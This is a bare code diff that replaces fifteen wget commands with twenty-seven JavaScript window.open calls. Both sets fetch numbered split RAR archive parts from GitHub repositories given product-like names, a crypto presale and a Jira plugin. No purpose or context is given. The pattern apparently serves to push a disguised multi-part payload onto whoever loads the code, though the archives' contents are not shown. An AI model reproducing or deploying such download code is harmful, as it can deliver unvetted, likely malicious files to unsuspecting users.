@@ -1,15 +1,27 @@
-wget https://github.com/Benjamin8330/multichain-presale-mmix/tree/master/71-90/Downloads.part01.rar
-wget https://github.com/Benjamin8330/multichain-presale-mmix/tree/master/71-90/Downloads.part02.rar
-wget https://github.com/Benjamin8330/multichain-presale-mmix/tree/master/71-90/Downloads.part03.rar
-wget https://github.com/Benjamin8330/multichain-presale-mmix/tree/master/71-90/Downloads.part04.rar
-wget https://github.com/Benjamin8330/multichain-presale-mmix/tree/master/71-90/Downloads.part05.rar
-wget https://github.com/Benjamin8330/multichain-presale-mmix/tree/master/71-90/Downloads.part06.rar
-wget https://github.com/Benjamin8330/multichain-presale-mmix/tree/master/71-90/Downloads.part07.rar
-wget https://github.com/Benjamin8330/multichain-presale-mmix/tree/master/71-90/Downloads.part08.rar
-wget https://github.com/Benjamin8330/multichain-presale-mmix/tree/master/71-90/Downloads.part09.rar
-wget https://github.com/Benjamin8330/multichain-presale-mmix/tree/master/71-90/Downloads.part10.rar
-wget https://github.com/Benjamin8330/multichain-presale-mmix/tree/master/71-90/Downloads.part11.rar
-wget https://github.com/Benjamin8330/multichain-presale-mmix/tree/master/71-90/Downloads.part12.rar
-wget https://github.com/Benjamin8330/multichain-presale-mmix/tree/master/71-90/Downloads.part13.rar
-wget https://github.com/Benjamin8330/multichain-presale-mmix/tree/master/71-90/Downloads.part14.rar
-wget https://github.com/Benjamin8330/multichain-presale-mmix/tree/master/71-90/Downloads.part15.rar
+window.open('https://github.com/Benjamin8330/jira_plugin/raw/refs/heads/main/jira-extentions/tar/plugins.part01.rar');
+window.open('https://github.com/Benjamin8330/jira_plugin/raw/refs/heads/main/jira-extentions/tar/plugins.part02.rar');
+window.open('https://github.com/Benjamin8330/jira_plugin/raw/refs/heads/main/jira-extentions/tar/plugins.part03.rar');
+window.open('https://github.com/Benjamin8330/jira_plugin/raw/refs/heads/main/jira-extentions/tar/plugins.part04.rar');
+window.open('https://github.com/Benjamin8330/jira_plugin/raw/refs/heads/main/jira-extentions/tar/plugins.part05.rar');
+window.open('https://github.com/Benjamin8330/jira_plugin/raw/refs/heads/main/jira-extentions/tar/plugins.part06.rar');
+window.open('https://github.com/Benjamin8330/jira_plugin/raw/refs/heads/main/jira-extentions/tar/plugins.part07.rar');
+window.open('https://github.com/Benjamin8330/jira_plugin/raw/refs/heads/main/jira-extentions/tar/plugins.part08.rar');
+window.open('https://github.com/Benjamin8330/jira_plugin/raw/refs/heads/main/jira-extentions/tar/plugins.part09.rar');
+window.open('https://github.com/Benjamin8330/jira_plugin/raw/refs/heads/main/jira-extentions/tar/plugins.part10.rar');
+window.open('https://github.com/Benjamin8330/jira_plugin/raw/refs/heads/main/jira-extentions/tar/plugins.part11.rar');
+window.open('https://github.com/Benjamin8330/jira_plugin/raw/refs/heads/main/jira-extentions/tar/plugins.part12.rar');
+window.open('https://github.com/Benjamin8330/jira_plugin/raw/refs/heads/main/jira-extentions/tar/plugins.part13.rar');
+window.open('https://github.com/Benjamin8330/jira_plugin/raw/refs/heads/main/jira-extentions/tar/plugins.part14.rar');
+window.open('https://github.com/Benjamin8330/jira_plugin/raw/refs/heads/main/jira-extentions/tar/plugins.part15.rar');
+window.open('https://github.com/Benjamin8330/jira_plugin/raw/refs/heads/main/jira-extentions/tar/plugins.part16.rar');
+window.open('https://github.com/Benjamin8330/jira_plugin/raw/refs/heads/main/jira-extentions/tar/plugins.part17.rar');
+window.open('https://github.com/Benjamin8330/jira_plugin/raw/refs/heads/main/jira-extentions/tar/plugins.part18.rar');
+window.open('https://github.com/Benjamin8330/jira_plugin/raw/refs/heads/main/jira-extentions/tar/plugins.part19.rar');
+window.open('https://github.com/Benjamin8330/jira_plugin/raw/refs/heads/main/jira-extentions/tar/plugins.part20.rar');
+window.open('https://github.com/Benjamin8330/jira_plugin/raw/refs/heads/main/jira-extentions/tar/plugins.part21.rar');
+window.open('https://github.com/Benjamin8330/jira_plugin/raw/refs/heads/main/jira-extentions/tar/plugins.part22.rar');
+window.open('https://github.com/Benjamin8330/jira_plugin/raw/refs/heads/main/jira-extentions/tar/plugins.part23.rar');
+window.open('https://github.com/Benjamin8330/jira_plugin/raw/refs/heads/main/jira-extentions/tar/plugins.part24.rar');
+window.open('https://github.com/Benjamin8330/jira_plugin/raw/refs/heads/main/jira-extentions/tar/plugins.part25.rar');
+window.open('https://github.com/Benjamin8330/jira_plugin/raw/refs/heads/main/jira-extentions/tar/plugins.part26.rar');
+window.open('https://github.com/Benjamin8330/jira_plugin/raw/refs/heads/main/jira-extentions/tar/plugins.part27.rar');
